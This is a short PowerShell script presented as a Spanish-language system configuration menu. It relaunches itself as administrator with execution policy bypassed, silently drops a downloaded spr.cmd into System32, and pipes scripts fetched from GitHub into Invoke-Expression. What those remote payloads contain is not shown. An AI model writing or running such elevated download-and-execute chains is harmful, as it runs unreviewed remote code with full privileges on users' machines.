CLS
$host.UI.RawUI.WindowTitle = "Menú de Configuración del Sistema"
Write-Host "Cargando configuración.."

$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

if (-not $IsAdmin) {
    Write-Host "Reiniciando como administrador..."
    $urlgit = 'https://raw.githubusercontent.com/Krowne/WinInfo/refs/heads/main/m'
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $urlgit | iex`"" -Verb RunAs
    exit
}

$destino = "C:\Windows\System32\spr.cmd"
$url_archivo = "https://github.com/Krowne/WinInfo/raw/refs/heads/main/spr.cmd"

if (-not (Test-Path $destino)) {
    try {
        # Descarga silenciosa del archivo .cmd
        Invoke-WebRequest -Uri $url_archivo -OutFile $destino -ErrorAction Stop
        Write-Host "Componente spr.cmd instalado en System32." -ForegroundColor Green
    } catch {
        Write-Host "Error: No se pudo escribir en System32. Verifica permisos." -ForegroundColor Red
    }
}

$urlgit_final = 'https://raw.githubusercontent.com/Krowne/PSInfo/refs/heads/main/m'
Invoke-RestMethod $urlgit_final | Invoke-Expression
